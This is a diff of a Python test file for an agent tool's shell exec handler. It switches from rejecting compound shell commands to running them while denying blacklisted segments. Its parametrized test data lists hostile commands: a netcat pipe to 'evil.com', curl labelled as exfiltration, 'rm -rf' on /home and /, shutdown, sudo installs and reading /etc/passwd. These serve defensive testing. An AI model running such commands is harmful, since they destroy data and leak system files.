@@ -13,7 +13,6 @@ import ralph.mcp.tools.exec as exec_tool
 from ralph.mcp.protocol.session import AgentSession
 from ralph.mcp.tools.coordination import (
     CapabilityDeniedError,
-    InvalidParamsError,
     ToolContent,
 )
 from ralph.mcp.tools.exec import (
@@ -208,55 +207,63 @@ class TestRunCommandAlwaysBounded:
         assert captured == [DEFAULT_TIMEOUT_MS / 1000]
 
 
-class TestExecRejectsShellOperators:
-    """Security: exec must reject shell control operators at the trust boundary.
+class TestExecShellOperators:
+    """exec runs compound shell commands but keeps the blacklist.
 
-    The per-token blacklist in ``check_command`` only inspects the command
-    name and the argv list it parsed out. If a compound / piped /
-    redirected command is forwarded to ``sh -c`` the embedded
-    sub-commands (curl to a remote URL, sudo, ``rm -rf /``) bypass the
-    blacklist entirely because the policy never sees them. The exec
-    boundary must reject any shell control character in the raw
-    command string and direct the caller to ``unsafe_exec`` /
-    ``raw_exec`` (the documented surface for compound shell work).
+    A command STRING with an unquoted ``| & ; < >`` operator is run through
+    ``sh -c`` so pipes/redirections/sequences work. The per-token blacklist in
+    ``check_command`` is enforced against EVERY command in the pipeline before
+    the shell runs, so a blacklisted command hiding after a separator
+    (``echo hi; sudo ...``) is still denied.
     """
+
+    def test_pipe_command_runs_and_returns_output(self, tmp_path: Path) -> None:
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        params: dict[str, object] = {
+            "command": "printf 'a\\nb\\na\\n' | grep a | wc -l",
+            "timeout_ms": 5000,
+        }
+
+        result = handle_exec_command(session, workspace, params)
+
+        assert result.is_error is False
+        content = result.content[0]
+        assert isinstance(content, ToolContent)
+        assert "Exit code: 0" in content.text
+        assert "2" in content.text  # two lines matched
+
+    def test_redirection_command_runs(self, tmp_path: Path) -> None:
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        out = tmp_path / "out.txt"
+        params: dict[str, object] = {
+            "command": f"echo redirected > {out}",
+            "timeout_ms": 5000,
+        }
+
+        result = handle_exec_command(session, workspace, params)
+
+        assert result.is_error is False
+        assert out.read_text().strip() == "redirected"
 
     @pytest.mark.parametrize(
         "compound_command",
         [
-            "echo safe; curl https://example.com",
-            "echo x && sudo apt install vim",
-            "cat /etc/passwd > /tmp/steal.txt",
-            "echo hi | nc evil.com 80",
-            "ls;rm -rf /;shutdown -h now",
-            "echo hi || curl https://example.com",
-            "echo hi ; rm -rf /tmp",  # unquoted ; — must be rejected
-            "echo hi & rm -rf /tmp",
+            "echo safe; curl https://example.com",  # network exfiltration segment
+            "echo x && sudo apt install vim",  # privilege escalation segment
+            "echo hi | nc evil.com 80",  # network tunnel segment
+            "ls; shutdown -h now",  # destructive system segment
+            "echo hi || rm -rf /home",  # destructive rm segment
         ],
     )
-    def test_parse_exec_params_rejects_shell_operators(
-        self, compound_command: str
+    def test_blacklisted_command_in_pipeline_denied(
+        self, tmp_path: Path, compound_command: str
     ) -> None:
-        with pytest.raises(InvalidParamsError) as exc_info:
-            parse_exec_params({"command": compound_command})
-        message = str(exc_info.value)
-        assert "unsafe_exec" in message or "raw_exec" in message, (
-            "Rejection must point the caller at the documented "
-            "compound-shell surface, not a generic error"
-        )
-
-    def test_handle_exec_command_rejects_compound_shell(
-        self, tmp_path: Path
-    ) -> None:
-        """Top-level handler propagates the parse-time rejection."""
         session = MockSession({"ProcessExecBounded"})
         workspace = MockWorkspaceRoot(tmp_path)
-        with pytest.raises(InvalidParamsError):
-            handle_exec_command(
-                session,
-                workspace,
-                {"command": "echo safe; curl https://example.com"},
-            )
+        with pytest.raises(CapabilityDeniedError):
+            handle_exec_command(session, workspace, {"command": compound_command})
 
     def test_safe_command_without_operators_still_allowed(self) -> None:
         """A regression check: a single non-compound command still parses."""
